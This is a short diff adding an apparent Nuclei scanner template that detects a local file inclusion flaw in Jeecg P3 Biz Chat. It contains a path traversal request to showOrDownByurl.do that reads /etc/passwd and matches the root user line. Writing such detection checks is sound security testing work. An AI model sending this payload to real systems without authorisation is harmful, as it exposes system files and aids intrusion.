@@ -1,0 +1,20 @@
+id: jeecg-boot-showOrDownByurl-lfi
+
+info:
+  name: Jeecg P3 Biz Chat - Local File Inclusion
+  author: DhiyaneshDK
+  severity: high
+  tags: cve,cve2023,jeecg,lfi
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd"
+      # - "{{RootURL}}/jeecg-boot/chat/imController/showOrDownByurl.do?dbPath=../../../../../../etc/passwd"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "root:x:0:0:")'  # 匹配/etc/passwd中root用户的特征字符串
+        condition: and
